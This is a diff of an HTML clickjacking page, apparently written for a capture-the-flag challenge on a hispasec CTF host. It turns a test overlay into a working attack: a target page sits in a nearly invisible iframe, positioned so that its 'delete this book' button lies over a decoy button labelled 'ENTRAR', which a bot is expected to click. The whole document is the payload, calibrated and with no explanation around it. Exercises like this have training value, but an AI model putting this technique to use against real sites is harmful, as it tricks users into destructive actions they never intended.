@@ -2,20 +2,18 @@
 <html>
 <head>
     <meta charset="utf-8">
+    <title>Clickjacking Test</title>
     <style>
-        /* El botón que el bot busca por ID */
+        body { margin: 0; padding: 0; }
         #objetivo {
             position: absolute;
-            top: 300px; /* Posición estándar de clic de bot */
+            top: 250px; /* Altura segura para bots */
             left: 50%;
             transform: translateX(-50%);
-            width: 300px;
-            height: 100px;
+            width: 250px;
+            height: 50px;
             z-index: 1;
-            opacity: 0.1; /* Un poco visible para que veas dónde está */
         }
-
-        /* El iframe con la página del libro */
         iframe {
             position: absolute;
             top: 0;
@@ -24,19 +22,14 @@
             height: 1000px;
             border: none;
             z-index: 2;
-            /* CALIBRACIÓN CRÍTICA */
-            /* Este valor debe subir la página hasta que el botón gris 
-               de "Borrar este libro" tape a tu botón rojo */
-            margin-top: -730px; 
-            opacity: 0.5; /* CAMBIA A 0 PARA EL BOT */
+            /* Ajuste para que el botón 'Borrar' tape al tuyo */
+            margin-top: -735px; 
+            opacity: 0.001; /* Invisible pero funcional */
         }
     </style>
 </head>
 <body>
-
-    <button id="objetivo">CLICK ME</button>
-
+    <button id="objetivo">ENTRAR</button>
     <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
-
 </body>
 </html>
